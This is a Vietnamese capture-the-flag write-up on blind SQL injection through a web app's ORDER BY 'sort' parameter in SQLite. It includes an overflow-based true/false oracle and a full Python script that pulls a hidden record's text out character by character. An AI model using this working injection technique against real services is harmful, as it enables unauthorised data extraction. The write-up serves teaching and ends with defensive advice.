---
title: Doctor Bye Bye
date: 2026-10-12
ctf: FortID CTF 2026
category: web
difficulty: medium
tags:
  - SQL Injection
  - SQLite
---

# Doctor Bye Bye — Write-up

**Thể loại:** Web · **Kỹ thuật:** Blind SQL Injection (qua `ORDER BY`)

## Tóm tắt

Endpoint `/api/on-call` đưa tham số `sort` thẳng vào `ORDER BY` của câu SQL. Kết quả trả về không lộ dữ liệu, nên ta dùng **blind SQLi**: mỗi câu hỏi đúng/sai được chuyển thành HTTP 200 hoặc 400. Flag nằm ở một bản ghi bị ẩn (`id = 404`, `listed = 0`) trong cột `farewell_note`.

## Phân tích

- `initialize_database` chèn sẵn một bác sĩ `id=404` không hiển thị trong danh sách (`listed=0`), với flag trong `farewell_note`.
- Trong `app.py`, `sort` không được kiểm tra, nên có thể viết biểu thức SQL vào `ORDER BY`.

## Oracle (phân biệt đúng/sai)

Dùng `CASE WHEN` và lỗi tràn số nguyên:

```sql
CASE WHEN (<điều kiện>) THEN 1 ELSE abs(-9223372036854775807-1) END
```

- Điều kiện **đúng** → `ORDER BY 1` → HTTP **200**.
- Điều kiện **sai** → `abs(min int64)` gây tràn số → HTTP **400**.

## Khai thác

1. Dùng binary search để lấy độ dài flag: `length(farewell_note) > x`.
2. Với từng vị trí `i`, binary search mã Unicode: `unicode(substr(farewell_note, i, 1)) > x`.
3. Ghép các ký tự lại.

Script đầy đủ (đã chạy thử trên bản local với flag giả):

```python
import sys, urllib.parse, urllib.request

BASE = sys.argv[1].rstrip("/")
NOTE = "(SELECT {} FROM doctors WHERE id=404)"

def ask(cond):
    sort = f"CASE WHEN ({cond}) THEN 1 ELSE abs(-9223372036854775807-1) END"
    url = f"{BASE}/api/on-call?sort={urllib.parse.quote(sort)}"
    try:
        with urllib.request.urlopen(url) as r:
            return r.status == 200
    except urllib.error.HTTPError as e:
        return e.code == 200

def extract_int(expr, upper):
    lo, hi = 0, upper
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if ask(f"{expr} > {mid - 1}"):
            lo = mid
        else:
            hi = mid - 1
    return lo

length = extract_int(NOTE.format("length(farewell_note)"), 512)
flag = "".join(
    chr(extract_int(NOTE.format(f"unicode(substr(farewell_note,{i},1))"), 127))
    for i in range(1, length + 1)
)
print(flag)
```

Lưu ý: app kiểm tra flag bằng `endswith("}")`, nên khi tạo file flag trên máy local không được có ký tự xuống dòng cuối (dùng `printf` thay vì `echo`).

## Bài học

- Không nối tham số người dùng vào `ORDER BY`. Phải dùng whitelist cho tên cột/chiều sắp xếp.
- Ngay cả khi không có dữ liệu trả về, blind SQLi vẫn lấy được dữ liệu qua khác biệt trạng thái (200/400, thời gian, v.v.).
